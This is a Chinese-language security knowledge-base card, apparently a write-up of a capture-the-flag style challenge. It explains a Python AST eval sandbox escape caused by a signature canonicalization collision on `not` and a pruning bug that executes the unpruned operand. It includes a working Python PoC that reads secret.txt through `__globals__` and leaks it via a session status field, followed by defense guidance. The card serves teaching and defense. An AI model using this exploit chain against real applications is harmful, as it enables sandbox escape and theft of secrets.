---
id: web-python-framework-ast-eval-signature-canonicalization-bypass
title: Python AST 规则引擎签名规范化碰撞与 exec 剪枝缺陷导致沙箱逃逸
type: scenario
domain: web
path: web/python/framework
technique: python-ast-eval-sandbox-signature-collision
tags:
- web
- python
- ast
- sandbox-escape
- eval
- signature-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:19:40+08:00'
  notes: 已对照原文 sanitizer.py 与 exp 核对：_canon 对 UnaryOp(Not) 固定返回 NOT(*)，故 /prepare 的 not 1 签名可用于 not(<任意表达式>)；_prune_node_exec 在 UnaryOp(Not) 分支计算了剪枝operand却返回原始 node.operand，导致执行树保留未剪枝表达式；safe_eval_expr 的 locals 暴露 user 对象，经 __class__.__init__.__globals__ 取 os/_sessions/request，将 secret.txt 字节写入当前会话 stage，再由 /status 带出。原文 exp 与卡内一致。PoC未本机执行；frontmatter无sources/source_url。
url: /docs/web/python/framework/web-python-framework-ast-eval-signature-canonicalization-bypass/
draft: false
kb_aliases:
- AST 沙箱逃逸
- eval 沙箱 not 万能签名
- canonicalize 碰撞
- prune_for_exec 缺陷
- 规则引擎签名绕过
---

## 一句话结论

规则引擎对“净化后的 AST”签名、却对“另一份剪枝后的 AST”执行；`not X` 的规范化结果固定为 `NOT(*)`（丢弃操作数），且 exec 剪枝对 `UnaryOp` 复用了未剪枝的原始操作数，于是任意表达式包进 `not (...)` 后都能通过验签并被执行，从而沿对象图拿到 `os`、Flask `request` 与会话表，读取 `secret.txt` 并通过 `/status` 的 `stage` 字段带出。

## 原理

- 请求分两阶段：`/prepare` 解析并严格净化 payload，对净化结果做规范化字符串 `canonical`，再用服务端密钥签名并发放 nonce；`/execute` 重新解析 payload，先 `prune_for_verify()` 生成“验签视图”，净化、规范化后验证签名，验签通过再用 `prune_for_exec()` 生成执行树交给 `eval`。
- 规范化函数 `_canon()` 对 `ast.UnaryOp(Not)` 直接返回固定字符串 `"NOT(*)"`，完全不包含操作数。因此 `not 1` 与 `not (<任意表达式>)` 的规范化结果相同，`/prepare` 用 `not 1` 拿到的 nonce+sig 可复用于任意 `not (...)` 载荷。
- 验签视图 `_prune_node_verify()` 会把不允许的 `Call/Attribute` 等剪成常量 `False`，所以 `not (<恶意表达式>)` 在验签侧变成 `not False`，规范化仍是 `NOT(*)`，签名匹配。
- 执行侧 `_prune_node_exec()` 对 `UnaryOp(Not)` 先计算了 `operand = _prune_node_exec(node.operand, policy)`，却返回 `ast.UnaryOp(op=ast.Not(), operand=node.operand)`——使用的是**原始未剪枝的 `node.operand`** 而非剪枝后的 `operand`。恶意表达式因此原样进入 `eval`。
- `eval` 的 globals 虽为 `{"__builtins__": {}}`，但 locals 中暴露了应用对象；通过 `user.__class__.__init__.__globals__` 可沿 Python 对象图取到定义该类的模块全局字典，其中含 `os`、Flask `request`、会话字典 `_sessions`，彻底绕过白名单。
- 取数外带：把文件内容 `int.from_bytes()` 后写入当前会话的 `stage`，`/status` 会原样返回 `stage`；攻击者再把整数还原为字节。应用把 `stage > 1000` 返回假 flag 的逻辑不影响该旁路。

## 触发条件

- 使用 `eval`/`exec` 执行用户可控的 Python 表达式，仅靠 AST 白名单做“沙箱”；
- 签名/验签使用的 AST 与实际执行的 AST 不是同一份，或规范化函数非单射（丢失信息）；
- 剪枝函数在重建节点时误用原始子节点；
- eval 的局部/全局命名空间中存在可沿 `__class__`、`__globals__`、`__init__` 到达模块全局的对象。

## 利用步骤

1. 审计规范化逻辑，寻找丢弃操作数或把不同 AST 映射为同一字符串的分支（如 `not`、常量归一化）。
2. 用最简单的合法表达式（如 `not 1`）调用 `/prepare`，取得 nonce 与签名。
3. 构造 `not (<恶意表达式>)`，把任意代码放在括号内。
4. 用同一 nonce/sig 调用 `/execute`；验签视图被剪成 `not False`，执行侧拿到原始表达式。
5. 从对象图定位模块全局（`obj.__class__.__init__.__globals__`），调用 `os`、`request` 等读取文件或篡改会话。
6. 通过一个可控且会回显的字段（本例 `stage`）把结果转成数字带出。

## PoC

先获取“万能签名”：

```python
import requests
s = requests.Session()
URL = "http://target/"
r = s.post(URL + "prepare", data={"payload": "not 1"}).json()
nonce, sig = r["nonce"], r["sig"]
```

再执行任意表达式：

```python
evil = (
    "user.__class__.__init__.__globals__['_sessions']"
    ".get(user.__class__.__init__.__globals__['request'].cookies.get('sid'))"
    ".__setattr__('stage', (1).__class__.from_bytes("
    "user.__class__.__init__.__globals__['os'].read("
    "user.__class__.__init__.__globals__['os'].open('secret.txt', 0), 64), 'big'))"
)
s.post(URL + "execute", data={"payload": "not (" + evil + ")", "nonce": nonce, "sig": sig})
stage = s.get(URL + "status").json()["stage"]
data = stage.to_bytes((stage.bit_length() + 7) // 8, "big")
print(data.decode(errors="ignore"))
```

## 变体与关联

- 任意“规范化/哈希”丢字段导致碰撞的签名方案都可类比，如 JWT 只签 header.payload、参数白名单拼接漏字段。
- 类似漏洞常见于自研表达式引擎、报表/规则平台、低代码公式计算；`eval` 白名单若允许属性访问，`__class__/__globals__` 链几乎必然可达。
- 若 `not` 未开放，可寻找其它 `_canon` 固定输出分支（如 `UnaryOp` 其他运算符、常量布尔归一化）。
- 与 Python SSTI 关联：都是沿对象图访问 `__globals__`/`os`，区别在于入口是 AST eval 而非模板。

## 检测与防御

- 不要 `eval` 用户表达式；使用独立的 AST 解释器，只实现允许的节点类型并自行求值。
- 验签与执行必须使用同一份净化后的 AST（一次解析、一次剪枝、单一真源），禁止“验签视图+执行视图”两套逻辑。
- 规范化必须保持单射：包含操作数与全部语义字段，或直接对序列化后的执行树做 HMAC。
- 修复 `_prune_node_exec` 使用未剪枝 `node.operand` 的缺陷；对所有节点统一用剪枝结果重建。
- 沙箱上下文只传值对象/字典，不暴露可反射到模块全局的对象；把不可信表达式放到独立进程/容器并剥离密钥。
- 代码审计搜索 `eval(`、`ast.parse`、`canonicalize`、`prune` 组合，重点核对验签视图与执行视图是否可差异构造。
